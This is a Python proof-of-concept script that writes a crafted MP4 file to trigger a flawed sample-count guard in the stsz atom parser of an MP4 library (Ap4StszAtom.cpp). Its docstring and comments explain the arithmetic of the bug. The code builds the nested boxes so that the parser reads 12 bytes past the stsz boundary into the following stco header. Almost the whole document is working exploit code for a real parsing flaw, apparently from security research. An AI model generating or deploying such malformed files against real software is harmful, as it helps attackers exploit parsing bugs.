#!/usr/bin/env python3
"""
PoC generator for VULN 003: stsz atom incorrect overflow guard.

Vulnerability: Ap4StszAtom.cpp line 78 uses guard `(size-8)/4` instead
of the correct `(size-20)/4`, allowing sample_count to be up to 3 entries
larger than the atom can hold. This makes stream.Read() consume 12 bytes
past the stsz atom's declared boundary (from the next box).

Trigger: box_size=28, sample_count=5
  - Correct max entries: (28-20)/4 = 2
  - Buggy guard allows: (28-8)/4 = 5  (check: 5 > 5 is FALSE, passes)
  - Read: 5*4=20 bytes, but only 8 bytes remain in atom
  - OOB: reads 12 bytes past stsz boundary into stco box header
"""

import struct
import os

POC_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(POC_DIR, 'vuln_003.mp4')


def make_box(fourcc: str, payload: bytes) -> bytes:
    """Build a simple (non-full) box: size(4) + type(4) + payload"""
    size = 8 + len(payload)
    return struct.pack('>I4s', size, fourcc.encode('latin1')) + payload


def make_fullbox(fourcc: str, version: int, flags: int, payload: bytes) -> bytes:
    """Build a FullBox: size(4) + type(4) + version(1) + flags(3) + payload"""
    vh = bytes([version & 0xFF]) + flags.to_bytes(3, 'big')
    return make_box(fourcc, vh + payload)


# ── stsz box (28 bytes total) ──────────────────────────────────────────────
# Layout inside the FullBox payload (after version+flags):
#   sample_size  (4B) = 0  → variable-size mode, enables entry table
#   sample_count (4B) = 5  → passes buggy guard (5 > (28-8)/4=5 is FALSE)
#   entries      (8B) = 2 real 4-byte entries (only 8 bytes of room in atom)
#
# When the constructor runs stream.Read(buffer, 5*4=20):
#   - reads 8 bytes of real entries from inside stsz
#   - reads 12 bytes from the immediately following stco box header (OOB)
# The factory then seeks back to stsz_start+28, so stco is still parsed OK.
STSZ_SAMPLE_SIZE  = 0       # 0 → variable-size mode
STSZ_SAMPLE_COUNT = 5       # passes buggy guard; correct max is 2
STSZ_REAL_ENTRIES = 2       # only 2 entries actually fit in the 28-byte box

stsz_payload = (
    struct.pack('>II', STSZ_SAMPLE_SIZE, STSZ_SAMPLE_COUNT) +
    struct.pack('>II', 0xDEADBEEF, 0xCAFEBABE)   # 2 real entries (8 bytes)
)
# FullBox: version(1B)=0 + flags(3B)=0 + payload = 4+12 = 16 bytes content
# Total box: 8(size+type) + 4(ver+flags) + 4(sample_size) + 4(sample_count) + 8(entries) = 28
stsz_box = make_fullbox('stsz', 0, 0, stsz_payload)
assert len(stsz_box) == 28, f"stsz box must be 28 bytes, got {len(stsz_box)}"

# ── stco box (16 bytes) ────────────────────────────────────────────────────
# Follows immediately after stsz. The OOB read pulls 12 bytes from here:
#   bytes 0-3:  stco box size   (0x00000010 = 16)
#   bytes 4-7:  stco type       ('stco')
#   bytes 8-11: version+flags   (0x00000000)
# stco itself: version(1)+flags(3)+entry_count(4) = 8 bytes payload
stco_box = make_fullbox('stco', 0, 0, struct.pack('>I', 0))  # entry_count = 0
assert len(stco_box) == 16, f"stco box must be 16 bytes, got {len(stco_box)}"

# ── Nesting: stbl → minf → mdia → trak → moov ─────────────────────────────
stbl_box = make_box('stbl', stsz_box + stco_box)   # 8 + 28 + 16 = 52
minf_box = make_box('minf', stbl_box)               # 8 + 52 = 60
mdia_box = make_box('mdia', minf_box)               # 8 + 60 = 68
trak_box = make_box('trak', mdia_box)               # 8 + 68 = 76  (AP4_TrakAtom)
moov_box = make_box('moov', trak_box)               # 8 + 76 = 84  (AP4_MoovAtom)

# ── ftyp box (optional but realistic) ─────────────────────────────────────
ftyp_box = make_box('ftyp',
    b'mp42'                   # major brand
    + struct.pack('>I', 0)    # minor version
    + b'mp42'                 # compatible brand
)  # 8 + 12 = 20

mp4_data = ftyp_box + moov_box

with open(OUTPUT_FILE, 'wb') as f:
    f.write(mp4_data)

print(f"[+] Written {len(mp4_data)} bytes to {OUTPUT_FILE}")
print(f"    ftyp: {len(ftyp_box)} bytes")
print(f"    moov: {len(moov_box)} bytes (trak/mdia/minf/stbl)")
print(f"    stsz: {len(stsz_box)} bytes  (sample_count=5, guard (28-8)/4=5, passes as 5>5 is false)")
print(f"    stco: {len(stco_box)} bytes  (immediately after stsz, provides 12 OOB bytes)")
print()
print("[*] Expected behaviour:")
print("    stream.Read(buffer, 20) in AP4_StszAtom ctor reads:")
print("      8 bytes  from inside stsz (2 real entries 0xDEADBEEF, 0xCAFEBABE)")
print("      12 bytes from stco header (size=0x10, type='stco', ver+flags=0)")
print("    No heap-buffer-overflow (buffer is correctly sized at 20 bytes).")
print("    Vulnerability is a stream-level OOB / information-disclosure.")
